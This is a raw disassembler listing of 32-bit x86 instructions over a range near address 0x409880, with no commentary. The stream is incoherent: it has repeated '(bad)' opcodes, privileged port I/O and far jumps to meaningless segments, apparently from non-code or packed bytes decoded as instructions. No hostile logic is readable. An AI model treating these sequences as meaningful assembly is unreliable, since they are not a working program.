  40987a:	xchg   edi,eax
  40987b:	pop    ds
  40987c:	mov    cl,0xd7
  40987e:	neg    BYTE PTR [eax+eax*1+0x21]
  409882:	push   es
  409883:	push   esi
  409884:	pusha  
  409885:	rol    al,0xb8
  409888:	rcr    BYTE PTR ds:0x2c1888c3,cl
  40988e:	inc    edx
  40988f:	imul   edi,DWORD PTR [edx+ecx*8],0xe7f81b0a
  409896:	cmp    eax,0xdf486fc5
  40989b:	xor    eax,0x7e851332
  4098a0:	inc    ebp
  4098a1:	ror    bh,0x3a
  4098a4:	ds or  al,al
  4098a7:	addr16 (bad) 
  4098a9:	jge    0x40987f
  4098ab:	out    dx,al
  4098ac:	out    0x4,eax
  4098ae:	inc    ecx
  4098af:	ret    
  4098b0:	in     al,0xba
  4098b2:	pop    edx
  4098b3:	call   0x1231f21b
  4098b8:	jne    0x4098bd
  4098ba:	pop    esp
  4098bb:	hlt    
  4098bc:	jp     0x4098f8
  4098be:	inc    ebp
  4098bf:	cmc    
  4098c0:	(bad)  
  4098c1:	jl     0x4098a8
  4098c3:	retf   
  4098c4:	jno    0x4098e1
  4098c6:	cwde   
  4098c7:	and    BYTE PTR [esi+0x6358dbb2],0x22
  4098ce:	hlt    
  4098cf:	push   esi
  4098d0:	jmp    esi
  4098d2:	sbb    bl,al
  4098d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098d5:	sub    eax,0x45ec5fd8
  4098da:	mov    edx,0xc48ab8bf
  4098df:	cdq    
  4098e0:	arpl   WORD PTR ds:0xdc76756,sp
  4098e6:	pop    esi
  4098e7:	adc    ebp,DWORD PTR [esi-0x1c237e8]
  4098ed:	in     eax,dx
  4098ee:	loop   0x4098af
  4098f0:	icebp  
  4098f1:	out    0x90,al
  4098f3:	xchg   edx,eax
  4098f4:	fisub  DWORD PTR [ebx*8-0x618c54a7]
  4098fb:	shl    DWORD PTR [edi+0x32],cl
  4098fe:	jnp    0x4098d4
  409900:	inc    esp
  409901:	or     DWORD PTR [edx-0x66],ebx
  409904:	and    DWORD PTR [ecx+0x23],ecx
  409907:	aam    0x71
  409909:	das    
  40990a:	adc    al,0x9b
  40990c:	cdq    
  40990d:	push   eax
  40990e:	mov    WORD PTR [edi-0x66],cs
  409911:	sbb    dh,BYTE PTR [esi+0x7d4d77c4]
  409917:	outs   dx,BYTE PTR ds:[esi]
  409918:	mov    ah,0x25
  40991a:	add    edi,DWORD PTR ds:0x453a3a2
  409920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409921:	jge    0x40996f
  409923:	pop    eax
  409924:	mov    ebx,0x4fac4cf2
  409929:	xchg   ecx,eax
  40992a:	jne    0x4098dd
  40992c:	ds push 0xc9157d33
  409932:	xchg   ebp,eax
  409933:	xchg   ebx,eax
  409934:	add    edi,DWORD PTR [ebx+0x79]
  409937:	cmp    bh,BYTE PTR [esi]
  409939:	push   0xca76806d
  40993e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40993f:	sbb    eax,0xc3a02da9
  409944:	jecxz  0x409995
  409946:	loop   0x4098e5
  409948:	(bad)  
  409949:	cmp    al,0x39
  40994b:	pop    es
  40994c:	ins    DWORD PTR es:[edi],dx
  40994d:	das    
  40994e:	mov    dh,0x98
  409950:	push   eax
  409951:	hlt    
  409952:	dec    ebx
  409953:	fdiv   DWORD PTR [ebx]
  409955:	jnp    0x4098d9
  409957:	(bad)  
  409958:	dec    DWORD PTR [edx]
  40995a:	enter  0x57b8,0xb3
  40995e:	mov    ebp,0xb93af705
  409963:	push   0xffffffc5
  409965:	mov    ch,0xd2
  409967:	pop    ebp
  409968:	xchg   edx,eax
  409969:	aam    0xb0
  40996b:	xor    eax,DWORD PTR [edx+0x7c]
  40996e:	pop    edi
  40996f:	ret    0x3890
  409972:	test   DWORD PTR [eax-0x4c],esp
  409975:	xor    al,0x2f
  409977:	or     eax,0x74a12a0f
  40997c:	inc    ecx
  40997d:	mov    ecx,DWORD PTR [edx+0x7d3fb114]
  409983:	int    0x6e
  409985:	xchg   esi,eax
  409986:	clc    
  409987:	push   es
  409988:	cmp    bl,BYTE PTR [eax-0x79]
  40998b:	mov    bl,0x4f
  40998d:	test   DWORD PTR [ecx],ecx
  40998f:	scas   eax,DWORD PTR es:[edi]
  409990:	push   0x601d4e83
  409995:	cmp    al,bh
  409997:	pop    ss
  409998:	and    BYTE PTR ds:0x1a1d8512,bl
  40999e:	sub    al,0xa1
  4099a0:	push   ds
  4099a1:	inc    ebp
  4099a2:	jne    0x4099ec
  4099a4:	(bad)  
  4099a5:	adc    BYTE PTR [esi-0x276a4a81],ah
  4099ab:	xchg   ebp,eax
  4099ac:	cs cmp ecx,edx
  4099af:	add    al,0x60
  4099b1:	dec    eax
  4099b2:	test   eax,0x9ef07519
  4099b7:	scas   al,BYTE PTR es:[edi]
  4099b8:	dec    ebp
  4099b9:	out    0xfa,eax
  4099bb:	cwde   
  4099bc:	pop    esp
  4099bd:	es mov dh,0x3e
  4099c0:	call   0x6c90a5c6
  4099c5:	xchg   edx,eax
  4099c6:	push   0xffffffe1
  4099c8:	aam    0xb
  4099ca:	mov    ds:0x7561a92d,al
  4099cf:	nop
  4099d0:	xor    esp,DWORD PTR [bp+di]
  4099d3:	xor    BYTE PTR [esi-0x410d457a],cl
  4099d9:	pop    es
  4099da:	jbe    0x4099d9
  4099dc:	lds    esi,FWORD PTR [edx+edi*8]
  4099df:	or     dl,0xe4
  4099e2:	(bad)
  4099e6:	mov    bl,0xe1
  4099e8:	fisub  DWORD PTR [eax+0xf]
  4099eb:	es cwde 
  4099ed:	mov    esp,0x859c5f53
  4099f2:	mov    ds:0x6716f09,al
  4099f7:	and    BYTE PTR [ecx-0x400e11e],0x1
  4099fe:	mov    WORD PTR [edi-0x5d7ebe5b],es
  409a04:	out    dx,eax
  409a05:	lods   eax,DWORD PTR ds:[esi]
  409a06:	jno    0x409a63
  409a08:	mov    esi,0x225900e3
  409a0d:	mov    esi,0x8d84c033
  409a12:	rcl    ecx,1
  409a14:	adc    eax,0xe98b7fb0
  409a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a1a:	xchg   al,dl
  409a1c:	sub    DWORD PTR [edi],esp
  409a1e:	push   0xfffffffc
  409a20:	shl    esp,1
  409a22:	push   cs
  409a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a24:	(bad)  
  409a25:	pop    DWORD PTR [ecx-0x5d]
  409a28:	pop    edi
  409a29:	adc    al,0xfe
  409a2b:	mov    edi,0x38dd7e34
  409a30:	scas   eax,DWORD PTR es:[edi]
  409a31:	lock lock pop ecx
  409a34:	mov    edx,0xedea24c0
  409a39:	jmp    0xe97e:0x80593187
  409a40:	adc    DWORD PTR [ebx-0x4d0fda4f],ebp
  409a46:	xchg   ecx,eax
  409a47:	into   
  409a48:	dec    ecx
  409a49:	loopne 0x409a5b
  409a4b:	fisub  DWORD PTR [edx-0x60]
  409a4e:	xlat   BYTE PTR ds:[ebx]
  409a4f:	cmp    al,0x3f
  409a51:	fisubr WORD PTR [ebx]
  409a53:	call   0x3310:0xd95b5b52
  409a5a:	push   ss
  409a5b:	rcl    BYTE PTR [ebx+0x77361023],cl
  409a61:	lahf   
  409a62:	fwait
  409a63:	(bad)  
  409a64:	fsubr  st,st(6)
  409a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a67:	sub    esi,eax
  409a69:	push   esp
  409a6a:	mov    ch,0xc7
  409a6c:	fiadd  DWORD PTR [ecx+0xc]
  409a6f:	sti    
  409a70:	mov    al,0x2a
  409a72:	js     0x409aae
  409a74:	mov    DWORD PTR [ebp-0x1f],eax
  409a77:	dec    ecx
  409a78:	sbb    al,0x59
  409a7a:	clc    
  409a7b:	fstp   DWORD PTR [eax]
  409a7d:	mov    ch,0x50
  409a7f:	cmp    al,0xa9
  409a81:	pop    esp
  409a82:	jns    0x409abd
  409a84:	inc    ebp
  409a85:	ror    BYTE PTR [ebp+0x29],0xdd
  409a89:	xor    al,0xd0
  409a8b:	xor    eax,ebx
  409a8d:	push   edx
  409a8e:	push   ds
  409a8f:	fnstenv [bp-0x2b16]
  409a94:	xchg   ebp,eax
  409a95:	jle    0x409a71
  409a97:	add    DWORD PTR [ecx-0x80],edx
  409a9a:	ins    DWORD PTR es:[edi],dx
  409a9b:	imul   esp,esi,0x56082b46
  409aa1:	or     ebx,DWORD PTR [ebx]
  409aa3:	sti    
  409aa4:	and    esi,ebp
  409aa6:	in     eax,dx
  409aa7:	jmp    0xc09f:0x76775be8
  409aae:	or     ah,BYTE PTR [ebx]
  409ab0:	and    DWORD PTR [edx],edi
  409ab2:	out    dx,eax
  409ab3:	iret   
  409ab4:	aaa    
  409ab5:	xor    al,0x31
  409ab7:	ret    0x6b00
  409aba:	add    esp,DWORD PTR [ebp+0x5cf9746d]
  409ac0:	or     eax,0x73cda0a5
  409ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac6:	dec    ecx
  409ac7:	std    
  409ac8:	xor    ecx,DWORD PTR [edx]
  409aca:	lods   al,BYTE PTR ds:[esi]
  409acb:	ret    
  409acc:	jmp    0x382b52b8
  409ad1:	out    dx,al
  409ad2:	mov    ds:0xe09250ae,al
  409ad7:	jg     0x409b48
  409ad9:	xor    al,0x3a
  409adb:	shl    DWORD PTR [edx-0x64],1
  409ade:	aam    0xb4
  409ae0:	mov    BYTE PTR ds:0x48c00939,dl
  409ae7:	add    ebp,eax
  409ae9:	sbb    BYTE PTR [ebp+0x22b529fd],dl
  409aef:	and    ebx,edi
  409af1:	ret    
  409af2:	push   ds
  409af3:	call   0xf14bc47b
  409af8:	pop    edx
  409af9:	push   ss
  409afa:	cmp    ebx,DWORD PTR [esi+esi*4-0x29]
  409afe:	clc    
  409aff:	push   0xa6fd2bb9
  409b04:	repz into 
  409b06:	scas   al,BYTE PTR es:[edi]
  409b07:	sub    DWORD PTR [eax-0x49],ebx
  409b0a:	mov    ecx,0x130c162
  409b0f:	lea    esi,[edi]
  409b11:	sbb    edx,DWORD PTR [ebx-0x46]
  409b14:	(bad)  
  409b15:	sub    eax,0xdd890b51
  409b1a:	ret    0xfd26
  409b1d:	cwde   
  409b1e:	xlat   BYTE PTR ds:[ebx]
  409b1f:	rcr    DWORD PTR [ebp+0x27ec90ee],cl
  409b25:	xor    eax,0xdb4cfb64
  409b2a:	out    0x99,eax
  409b2c:	add    eax,0x4fe6eaeb
  409b31:	xchg   DWORD PTR ds:[esi],esp
  409b34:	das    
  409b35:	xchg   ebx,eax
  409b36:	xchg   ebx,eax
  409b37:	and    DWORD PTR [ebx-0x7],ecx
  409b3a:	and    eax,0xfc85efea
  409b3f:	pop    es
  409b40:	and    BYTE PTR [edi-0x72],al
  409b43:	mov    dl,BYTE PTR [ebp+0x3b1e73f7]
  409b49:	pop    ds
  409b4a:	nop
  409b4b:	mov    ds:0x98b10353,eax
  409b50:	adc    ecx,0x0
  409b53:	inc    esi
  409b54:	test   al,0xaa
  409b56:	stos   DWORD PTR es:[edi],eax
  409b57:	add    al,0x98
  409b59:	jae    0x409b20
  409b5b:	mov    bh,BYTE PTR [esi-0x5250d3b3]
  409b61:	gs aad 0x9f
  409b64:	xor    BYTE PTR [ebp+0x60c5c298],0x32
  409b6b:	mov    BYTE PTR [ebx+eiz*4],dh
  409b6e:	stos   DWORD PTR es:[edi],eax
  409b6f:	ds mov esp,0x49a1b313
  409b75:	inc    esi
  409b76:	inc    edi
  409b77:	add    esi,DWORD PTR [ebx-0x23e3f9cd]
  409b7d:	add    esi,DWORD PTR fs:[ecx+ebx*2]
  409b81:	ret    0x5abf
  409b84:	(bad)  
  409b85:	jnp    0x409be1
  409b87:	cwde   
  409b88:	pusha  
  409b89:	sahf   
  409b8a:	pushf  
  409b8b:	pop    ebp
  409b8c:	add    eax,0x856c5228
  409b91:	ss loopne 0x409bca
  409b94:	rep lods eax,DWORD PTR ds:[esi]
  409b96:	push   ss
  409b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b98:	add    DWORD PTR [edi-0x6146ec25],esi
  409b9e:	cwde   
  409b9f:	aaa    
  409ba0:	pusha  
  409ba1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ba2:	xchg   esi,eax
  409ba3:	adc    BYTE PTR [ebx],dl
  409ba5:	icebp  
  409ba6:	adc    ebx,DWORD PTR [edx]
  409ba8:	mov    bl,0x2f
  409baa:	adc    ebx,0xffffffe6
  409bad:	xor    DWORD PTR [ebx],0xfffffffe
  409bb0:	shl    DWORD PTR [ecx+0x5be8c28],0xc1
  409bb7:	or     DWORD PTR [edi],ebx
  409bb9:	inc    edi
  409bba:	and    al,0xdd
  409bbc:	rol    BYTE PTR [edx+0x5],cl
  409bbf:	xchg   esp,eax
  409bc0:	and    dh,BYTE PTR [edx-0x7d388afe]
  409bc6:	rcr    BYTE PTR [esi+edi*1+0x27f1eb23],1
  409bcd:	adc    DWORD PTR [edi-0x579f0b00],eax
  409bd3:	lds    eax,FWORD PTR [edx-0x5b]
  409bd6:	lods   eax,DWORD PTR ds:[esi]
  409bd7:	cs dec ebx
  409bd9:	mov    edi,0x18da775a
  409bde:	mov    ss,WORD PTR [esi+0x515900e9]
  409be4:	mul    BYTE PTR [edx]
  409be6:	pop    edx
  409be7:	cmc    
  409be8:	cli    
  409be9:	xor    DWORD PTR [edi-0x4a452819],ebx
  409bef:	sub    BYTE PTR [eax-0x20],0xa3
  409bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bf4:	adc    eax,0xace1c278
  409bf9:	cld    
  409bfa:	xchg   BYTE PTR [ecx+0x783b475a],bl
  409c00:	lds    ebx,FWORD PTR [ebx*4+0x156d46a9]
  409c07:	xchg   ebp,eax
  409c08:	sub    BYTE PTR [esi+0x3db8f12],dl
  409c0e:	repz mov edi,DWORD PTR [edi-0x42]
  409c12:	cmp    DWORD PTR [ebp-0xd],edi
  409c15:	jae    0x409b99
  409c17:	data16 hlt 
  409c19:	pop    eax
  409c1a:	xor    cl,ch
  409c1c:	sbb    DWORD PTR [ebx],0xfffffff2
  409c1f:	les    ebp,FWORD PTR [ecx]
  409c21:	in     al,0x64
  409c23:	dec    eax
  409c24:	adc    al,0xb3
  409c26:	sub    al,BYTE PTR [ebp-0x4d7389c8]
  409c2c:	repz pusha 
  409c2e:	push   edi
  409c2f:	mov    eax,ds:0x21789eb6
  409c34:	cld    
  409c35:	sbb    al,0x6f
  409c37:	in     al,0x7
  409c39:	fild   DWORD PTR [ebp-0x71063ecd]
  409c3f:	jns    0x409c94
  409c41:	push   0xffffff8e
  409c43:	fsubr  DWORD PTR [ebx-0x79]
  409c46:	xor    dl,BYTE PTR [ecx+0x3]
  409c49:	mov    ds,WORD PTR [edx+0x1147b835]
  409c4f:	(bad)  
  409c50:	js     0x409c91
  409c52:	pop    ecx
  409c53:	sub    al,0xd7
  409c55:	ficomp WORD PTR [ebx-0xf]
  409c58:	lods   al,BYTE PTR ds:[esi]
  409c59:	popa   
  409c5a:	xor    eax,0xd4d90369
  409c5f:	fild   WORD PTR [ebx]
  409c61:	add    esp,DWORD PTR [esi+0x2d]
  409c64:	dec    edx
  409c65:	(bad)  
  409c67:	or     eax,0x8f729d91
  409c6c:	push   es
  409c6d:	cs xor ah,bl
  409c70:	jl     0x409c61
  409c72:	js     0x409bfa
  409c74:	aam    0x8f
  409c76:	cmp    edi,esp
  409c78:	cmp    dl,bl
  409c7a:	cdq    
  409c7b:	cmp    al,0x7b
  409c7d:	push   es
  409c7e:	sub    DWORD PTR [ebx],0x117601ae
  409c84:	jo     0x409ccb
  409c86:	stos   BYTE PTR es:[edi],al
  409c87:	(bad)  
  409c88:	pop    ecx
  409c89:	mov    ecx,ecx
  409c8b:	arpl   WORD PTR [esi],cx
  409c8d:	pusha  
  409c8e:	dec    edx
  409c8f:	stc    
  409c90:	dec    ebx
  409c91:	sbb    BYTE PTR [ebx-0x4d],al
  409c94:	push   es
  409c95:	aam    0x20
  409c97:	and    al,0x6
  409c99:	sub    al,BYTE PTR [ebp-0x5b9ada1d]
  409c9f:	cs ja  0x409ca3
  409ca2:	test   eax,0x2c3d8a19
  409ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ca8:	push   esi
  409ca9:	sub    al,0x55
  409cab:	hlt    
  409cac:	leave  
  409cad:	sbb    DWORD PTR [ecx-0x5f54d758],ecx
  409cb3:	scas   eax,DWORD PTR es:[edi]
  409cb4:	xchg   DWORD PTR [esp+eax*1+0xf],ebp
  409cb8:	sub    cl,al
  409cba:	push   ecx
  409cbb:	pop    ds
  409cbc:	pop    ebx
  409cbd:	cdq    
  409cbe:	rcr    BYTE PTR [ebp+0x15d7d1c7],1
  409cc4:	xor    dl,dl
  409cc6:	repz jnp 0x409d31
  409cc9:	add    eax,0xb35e66b
  409cce:	xchg   DWORD PTR [ecx+eax*2-0x79613bae],edi
  409cd5:	icebp  
  409cd6:	jnp    0x409d3e
  409cd8:	(bad)  
  409cda:	sub    al,0x71
  409cdc:	ficomp DWORD PTR [ecx-0x42]
  409cdf:	ins    BYTE PTR es:[edi],dx
  409ce0:	jge    0x409c8c
  409ce2:	inc    edi
  409ce3:	in     eax,0xaf
  409ce5:	jmp    0xa5d:0x6caccae1
  409cec:	mov    ebp,0x6216206a
  409cf1:	xor    ecx,DWORD PTR [ebx-0x1c]
  409cf4:	call   0x7383:0x5200742a
  409cfb:	ins    DWORD PTR es:[edi],dx
  409cfc:	jno    0x409ce0
  409cfe:	loop   0x409ca1
  409d00:	lock and eax,0x116d2371
  409d06:	out    0xf,al
  409d08:	std    
  409d09:	push   ss
  409d0a:	pop    esi
  409d0b:	adc    edx,ecx
  409d0d:	fcom   DWORD PTR [esi-0x344d8eef]
  409d13:	mov    al,0x3a
  409d15:	mov    ds:0x1d089196,al
  409d1a:	cmp    eax,0x22df91dc
  409d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d20:	cmp    BYTE PTR [ebx-0x5f023d20],al
  409d26:	pop    es
  409d27:	jo     0x409d46
  409d29:	stos   DWORD PTR es:[edi],eax
  409d2a:	fidiv  WORD PTR [esi+edi*2]
  409d2d:	sub    BYTE PTR [edx-0x2a],ah
  409d30:	in     al,0x29
  409d32:	cli    
  409d33:	or     al,0x71
  409d35:	in     eax,dx
  409d36:	(bad)  
  409d37:	ja     0x409cc1
  409d39:	xor    DWORD PTR [ecx-0x4d],eax
  409d3c:	adc    esp,DWORD PTR [esi+0x46df039f]
  409d42:	xor    BYTE PTR [esi],cl
  409d44:	nop
  409d45:	pop    ebx
  409d46:	repnz loop 0x409d2d
  409d49:	enter  0xa2f3,0xfc
  409d4d:	mov    bh,0x14
  409d4f:	adc    ah,BYTE PTR [ebx-0x7d609b1f]
  409d55:	add    BYTE PTR [ecx+0x2e33a35d],dl
  409d5b:	add    al,0x2
  409d5d:	jmp    FWORD PTR [esi+ebp*4-0x33]
  409d61:	cli    
  409d62:	adc    DWORD PTR [edi+0x2d433e19],edx
  409d68:	push   ss
  409d69:	pop    ss
  409d6a:	lahf   
  409d6b:	push   es
  409d6c:	or     BYTE PTR [ebp+0x6e],bh
  409d6f:	retf   
  409d70:	in     eax,dx
  409d71:	jne    0x409dba
  409d73:	mov    ebp,0xa71eed6d
  409d78:	cld    
  409d79:	dec    ebx
  409d7a:	cld    
  409d7b:	repnz mov al,0x8c
  409d7e:	xor    BYTE PTR [edi],cl
  409d80:	mov    fs,WORD PTR [esi-0x77]
  409d83:	fst    QWORD PTR [esi]
  409d85:	sbb    eax,0xdfc0070f
  409d8a:	std    
  409d8b:	or     cl,0x85
  409d8e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  409d90:	mov    edi,0x777ddcba
  409d95:	mov    dl,0x16
  409d98:	test   edi,esp
  409d9a:	loop   0x409d7e
  409d9c:	xor    bh,dh
  409d9e:	xchg   esp,eax
  409d9f:	add    eax,0xbc37c748
  409da4:	into   
  409da5:	xchg   ebx,eax
  409da6:	jno    0x409dc9
  409da8:	out    dx,eax
  409da9:	xchg   esp,ebx
  409dab:	cmp    al,0xbc
  409dad:	mov    ebp,0x567d58dc
  409db2:	out    0xe6,eax
  409db4:	pmaxub mm0,QWORD PTR [edi]
  409db7:	xchg   BYTE PTR [ecx-0x20],dl
  409dba:	dec    ebp
  409dbb:	push   0xfffffffc
  409dbd:	daa    
  409dbe:	sub    al,BYTE PTR [edi-0x66bb6686]
  409dc4:	pop    esp
  409dc5:	push   edx
  409dc6:	dec    esp
  409dc7:	jl     0x409da8
  409dc9:	(bad)  
  409dca:	loop   0x409e42
  409dcc:	jecxz  0x409dc9
  409dce:	xchg   esi,eax
  409dcf:	sbb    DWORD PTR [eax],ebp
  409dd1:	xchg   al,dl
  409dd3:	cmp    al,0x2a
  409dd5:	cmc    
  409dd6:	inc    esi
  409dd7:	mov    esp,0x9ae4cb5d
  409ddc:	pop    ebx
  409ddd:	add    al,0xda
  409ddf:	jnp    0x409dcd
  409de1:	(bad)  
  409de2:	cld    
  409de3:	sub    al,0x40
  409de5:	(bad)  
  409de6:	mov    esi,0xb8e92e3a
  409deb:	js     0x409db3
  409ded:	fcmovb st,st(6)
  409def:	inc    edx
  409df0:	push   ss
  409df1:	sbb    eax,0xb4a17a1b
  409df6:	outs   dx,DWORD PTR ds:[esi]
  409df7:	retf   0x4a46
  409dfa:	out    0xb3,al
  409dfc:	adc    DWORD PTR [ebp+ebx*4-0x45],ebx
  409e00:	mov    ah,0x8e
  409e02:	mul    DWORD PTR [esi]
  409e04:	fidiv  WORD PTR [edx]
  409e06:	adc    BYTE PTR ds:0x99ab7323,bl
  409e0c:	push   ss
  409e0d:	nop
  409e0e:	int    0x32
  409e10:	stc    
  409e11:	push   ecx
  409e12:	push   es
  409e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e14:	push   esp
  409e15:	mov    ds:0x57fd8ff1,eax
  409e1a:	or     al,0x52
  409e1c:	push   edx
  409e1d:	push   esp
  409e1e:	jnp    0x409daa
  409e20:	inc    esi
  409e21:	adc    al,0x8d
  409e23:	bound  edi,QWORD PTR [edi+0x65]
  409e26:	cmp    DWORD PTR [edx],edx
  409e28:	pop    esi
  409e29:	cwde   
  409e2a:	inc    edx
  409e2b:	dec    edx
  409e2c:	stc    
  409e2d:	sub    al,0x64
  409e2f:	xchg   ebx,eax
  409e30:	add    bh,BYTE PTR [ebp+0x4e]
  409e33:	mov    al,ds:0xe129cdb0
  409e38:	inc    esp
  409e39:	loope  0x409e5d
  409e3b:	cwde   
  409e3c:	stos   BYTE PTR es:[edi],al
  409e3d:	repz and DWORD PTR [ebp-0x7188c5eb],edx
  409e44:	fild   DWORD PTR [edi-0xdedec5a]
  409e4a:	inc    esi
  409e4b:	lods   eax,DWORD PTR ds:[esi]
  409e4c:	sbb    al,0xaa
  409e4e:	or     al,0xcb
  409e50:	mov    eax,0xdafcf69e
  409e55:	jmp    0x409e13
  409e57:	mov    bh,0xd3
  409e59:	cld    
  409e5a:	xor    edi,DWORD PTR [eax+0x358aea58]
  409e60:	stos   DWORD PTR es:[edi],eax
  409e61:	mov    bh,0x82
  409e63:	sbb    eax,0x153b1425
  409e68:	pop    esp
  409e69:	aaa    
  409e6a:	pop    ds
  409e6b:	imul   ecx,ebx,0xb3da815f
  409e71:	rcr    BYTE PTR [ebx+0x26e2566d],1
  409e77:	mov    BYTE PTR [edi+0x20da33fb],bh
  409e7d:	stos   DWORD PTR es:[edi],eax
  409e7e:	ja     0x409ecf
  409e80:	inc    edx
  409e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e82:	(bad)  
  409e83:	sbb    DWORD PTR [ebx+0x7dcd03e],ebp
  409e89:	inc    ecx
  409e8a:	push   edi
  409e8b:	inc    ecx
  409e8c:	cmp    al,0x8e
  409e8e:	sbb    ebx,ecx
  409e90:	into   
  409e91:	mov    al,ds:0x12d21017
  409e96:	(bad)  
  409e97:	pop    eax
  409e98:	imul   ecx,DWORD PTR ds:0x9499267b,0xffffff87
  409e9f:	jp     0x409e89
  409ea1:	aam    0xe3
  409ea3:	mov    edi,0xe69530f0
  409ea8:	div    DWORD PTR [edx+0x74]
  409eab:	in     eax,0xb8
  409ead:	mov    dh,0x53
  409eaf:	push   cs
  409eb0:	mov    ds:0x52e85fe0,al
  409eb5:	pop    ds
  409eb6:	pop    es
  409eb7:	xchg   edi,eax
  409eb8:	sahf   
  409eb9:	mov    esi,0xe0d8cb79
  409ebe:	inc    ebp
  409ebf:	adc    BYTE PTR [ebp+edx*1+0x47871218],bl
  409ec6:	dec    ebp
  409ec7:	sbb    esp,edx
  409ec9:	stc    
  409eca:	pop    edi
  409ecb:	shl    BYTE PTR [esp+eax*1-0x79],cl
  409ecf:	dec    esi
  409ed0:	inc    ebx
  409ed1:	inc    ebp
  409ed2:	add    al,0x4c
  409ed4:	hlt    
  409ed5:	cmp    BYTE PTR [eax-0x1daa1d86],dl
  409edb:	mov    ?,WORD PTR [esi+0x15c407fd]
  409ee1:	call   0x8d15:0x4655b89c
  409ee8:	test   BYTE PTR [ecx+0x1270428c],bh
  409eee:	sub    eax,DWORD PTR [eax-0xf]
  409ef1:	iret   
  409ef2:	out    dx,eax
  409ef3:	cmp    eax,0xc7d6e5fd
  409ef8:	push   ebx
  409ef9:	iret   
  409efa:	push   ss
  409efb:	xor    eax,0x2b67d5b0
  409f00:	adc    al,0xe8
  409f02:	push   ebp
  409f03:	dec    edi
  409f04:	pop    esi
  409f05:	call   0xc6e674f0
  409f0a:	sbb    al,0x28
  409f0c:	les    ebx,FWORD PTR [ecx]
  409f0e:	into   
  409f0f:	nop
  409f10:	jno    0x409ea5
  409f12:	out    dx,al
  409f13:	add    BYTE PTR [ecx-0x57],ch
  409f16:	mov    cl,0xba
  409f18:	pop    edx
  409f19:	push   0x8
  409f1b:	outs   dx,BYTE PTR ds:[esi]
  409f1c:	daa    
  409f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f1e:	int3   
  409f1f:	add    bh,al
  409f21:	sbb    al,0x5b
  409f23:	and    eax,0x561dd603
  409f28:	xlat   BYTE PTR ds:[ebx]
  409f29:	nop
  409f2a:	mov    dl,0xad
  409f2c:	loop   0x409efc
  409f2e:	sbb    BYTE PTR [edx],al
  409f30:	pop    eax
  409f31:	push   ds
  409f32:	push   edx
  409f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f34:	jb     0x409f15
  409f36:	ret    
  409f37:	icebp  
  409f38:	stos   DWORD PTR es:[edi],eax
  409f39:	and    ebp,DWORD PTR ds:0xb21f73f3
  409f3f:	fimul  DWORD PTR [ebx+ebx*4-0x42]
  409f43:	sbb    esp,DWORD PTR [edx-0x71227483]
  409f49:	push   ss
  409f4a:	cs ins DWORD PTR es:[edi],dx
  409f4c:	lahf   
  409f4d:	sahf   
  409f4e:	inc    ebp
  409f4f:	jno    0x409f36
  409f51:	ret    0x2e05
  409f54:	scas   eax,DWORD PTR es:[edi]
  409f55:	loopne 0x409fc7
  409f57:	aaa    
  409f58:	dec    ebx
  409f59:	xor    eax,DWORD PTR ds:0x26e0a0de
  409f5f:	xor    eax,0xd982bbf1
  409f64:	pop    ds
  409f65:	retf   
  409f66:	leave  
  409f67:	mov    esi,0x728a320b
  409f6c:	add    BYTE PTR [esi],bh
  409f6e:	(bad)  
  409f6f:	in     al,0x97
  409f71:	push   esi
  409f72:	mov    ds:0x178c13f1,al
  409f77:	clc    
  409f78:	call   DWORD PTR ds:0x1d20307f
  409f7e:	(bad)  
  409f7f:	pop    edx
  409f80:	loop   0x409f6d
  409f82:	add    esp,DWORD PTR ds:0xdbbda78c
  409f88:	mov    ebp,DWORD PTR [ebp+0x1c557f23]
  409f8e:	pop    esi
  409f8f:	loop   0x409f8b
  409f91:	neg    DWORD PTR [ebx+0x18750aca]
  409f97:	add    DWORD PTR [ebx+0x241f5597],0x37
  409f9e:	push   esp
  409f9f:	fdiv   DWORD PTR [edx+0x62]
  409fa2:	addr16 jmp 0x126a9037
  409fa8:	gs xchg edi,eax
  409faa:	lods   al,BYTE PTR ds:[esi]
  409fab:	xchg   esp,eax
  409fac:	shl    DWORD PTR [ecx],cl
  409fae:	sub    ecx,ebx
  409fb0:	mov    bh,BYTE PTR [eax+0x74]
  409fb3:	cmp    eax,0x2a922f9d
  409fb8:	aam    0x8c
  409fba:	leave  
  409fbb:	mov    esp,0xea057f0e
  409fc0:	dec    ebp
  409fc1:	imul   ecx,DWORD PTR [ebp-0x34767e79],0x63
  409fc8:	pop    ebp
  409fc9:	mov    eax,ds:0xf8d7b2ce
  409fce:	jecxz  0x40a022
  409fd0:	pop    ss
  409fd1:	popa   
  409fd2:	xchg   BYTE PTR [esi+0x7a3e9bc6],bh
  409fd8:	call   0x554b:0x7ec5b213
  409fdf:	adc    ebx,DWORD PTR [edi-0x6]
  409fe2:	cwde   
  409fe3:	push   esi
  409fe4:	add    BYTE PTR [esp+eiz*4-0x11],0x1
  409fe9:	clc    
  409fea:	push   eax
  409feb:	leave  
  409fec:	or     al,0x7
  409fee:	aaa    
  409fef:	and    eax,0xd5ceced6
  409ff4:	int3   
  409ff5:	into   
  409ff6:	pop    ebp
  409ff7:	push   eax
  409ff8:	dec    eax
  409ff9:	cmp    al,0x3f
  409ffb:	(bad)  
  409ffc:	mov    al,0x5d
  409ffe:	xor    ebp,DWORD PTR [esi+eax*4-0x6b]
  40a002:	and    cl,ch
  40a004:	in     al,0xe4
  40a006:	dec    esi
  40a007:	int3   
  40a008:	fldenv [edx]
  40a00a:	mov    edx,0x30fa78bb
